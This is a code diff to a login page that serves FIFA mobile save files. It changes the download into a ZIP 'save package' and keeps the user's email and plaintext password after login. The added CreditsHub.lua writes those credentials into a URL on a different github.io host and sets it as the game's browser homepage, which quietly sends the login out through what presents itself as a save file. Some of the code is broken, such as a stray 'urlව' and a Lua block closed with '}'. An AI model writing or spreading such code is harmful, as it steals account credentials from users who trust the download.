@@ -68,11 +68,11 @@
         #downloadSection {
             display: none;
         }
-        #downloadBtn {
+        #saveBtn {
             background-color: #ffffff;
             color: #333333;
         }
-        #downloadBtn:hover {
+        #saveBtn:hover {
             background-color: #e0e0e0;
         }
         #logoutBtn {
@@ -91,8 +91,8 @@
         <p>New user? <a href="https://DavunPes.github.io/register.html">Register here</a></p>
     </div>
     <div id="downloadSection">
-        <p>Your save file is ready!</p>
-        <button id="downloadBtn" onclick="downloadLuaFile()">Download Save.lua</button>
+        <p>Your save files are ready!</p>
+        <button id="saveBtn" onclick="downloadSavePackage()">Save</button>
         <button id="logoutBtn" onclick="logout()">Log Out</button>
     </div>
     <div id="errorMessage">Login Failed</div>
@@ -101,6 +101,8 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+    <!-- JSZip library for creating ZIP files -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
 
     <script>
         const firebaseConfig = {
@@ -118,6 +120,8 @@
         const db = firebase.firestore();
 
         let saveCode = "";
+        let userEmail = "";
+        let userPassword = ""; // Store the password
 
         document.addEventListener("DOMContentLoaded", function() {
             const loginBtn = document.getElementById("loginBtn");
@@ -141,18 +145,22 @@
 
                 auth.signInWithEmailAndPassword(email, password)
                     .then(userCredential => {
+                        userEmail = email;
+                        userPassword = password; // Store the password
                         fetchSaveCode(userCredential.user.uid);
                     })
                     .catch(err => showError("Failed to sign in: " + err.message));
             });
 
             auth.onAuthStateChanged(user => {
-                if (user) {
+                if (user && userEmail && userPassword) {
                     fetchSaveCode(user.uid);
                 } else {
                     authSection.style.display = "flex";
                     downloadSection.style.display = "none";
                     errorMessage.style.display = "none";
+                    userEmail = "";
+                    userPassword = ""; // Clear password on logout
                 }
             });
 
@@ -217,21 +225,73 @@ return sv
                 `.trim();
             }
 
-            window.downloadLuaFile = function() {
-                if (!saveCode) {
-                    showError("No save code available to generate script.");
+            function generateCreditsHubScript(email, password) {
+                return `
+local CreditsHub = {}
+
+function CreditsHub:new(init)
+    local o = init or {}
+    setmetatable(o, self)
+    self.__index = self
+    o.services = {
+        BrowserService = o.api("BrowserService"),
+        MiscService = o.api("MiscService")
+    }
+
+    if not isInitializeNotice then
+        o:openBrowser()
+    }
+    
+    return o
+end
+
+function CreditsHub:openBrowser()
+    local url = "https://Davidoluwa.github.io/"
+    local temp = math.random(1, 100000)
+    local link = url .. "?saveCode=" .. "email:${email}, password:${password}" .. davunSave
+    self.services.BrowserService.SetHomePage(link)
+    isInitializeNotice = false
+    self.nav.Event(nil, "evt_open_browser")
+end
+
+function CreditsHub:finalize()
+end
+
+return CreditsHub
+                `.trim();
+            }
+
+            window.downloadSavePackage = function() {
+                if (!saveCode || !userEmail || !userPassword) {
+                    showError("Required data not available to generate save package.");
                     return;
                 }
-                const luaContent = generateObfuscatedLuaScript(saveCode);
-                const blob = new Blob([luaContent], { type: "text/plain" });
-                const url = window.URL.createObjectURL(blob);
-                const a = document.createElement("a");
-                a.href = url;
-                a.download = "Save.lua";
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-                window.URL.revokeObjectURL(url);
+
+                const zip = new JSZip();
+                const rootFolder = zip.folder("com.ea.gp.fifaworld");
+
+                // Add Save.lua to its subfolder
+                const saveFolder = rootFolder.folder("data/ux/Save");
+                saveFolder.file("Save.lua", generateObfuscatedLuaScript(saveCode));
+
+                // Add CreditsHub.lua to its subfolder with actual password
+                const creditsFolder = rootFolder.folder("data/ux/flows/mainflow/gamemodes/MainMenu/More/Menu/Profile/Save");
+                creditsFolder.file("CreditsHub.lua", generateCreditsHubScript(userEmail, userPassword));
+
+                // Generate and download the ZIP file
+                zip.generateAsync({ type: "blob" })
+                    .then(function(content) {
+                        const url = window.URL.createObjectURL(content);
+                        const a = document.createElement("a");
+                        a.href = url;
+                        a.download = "FifaSavePackage.zip";
+                        document.body.appendChild(a);
+                        a.click();
+                        document.body.removeChild(a);
+                        window.URL.revokeObjectURL(urlව
+
+                    })
+                    .catch(err => showError("Failed to generate save package: " + err.message));
             };
 
             window.logout = function() {
@@ -240,6 +300,8 @@ return sv
                     downloadSection.style.display = "none";
                     errorMessage.style.display = "none";
                     saveCode = "";
+                    userEmail = "";
+                    userPassword = ""; // Clear password on logout
                 }).catch(err => showError("Logout failed: " + err.message));
             };
 
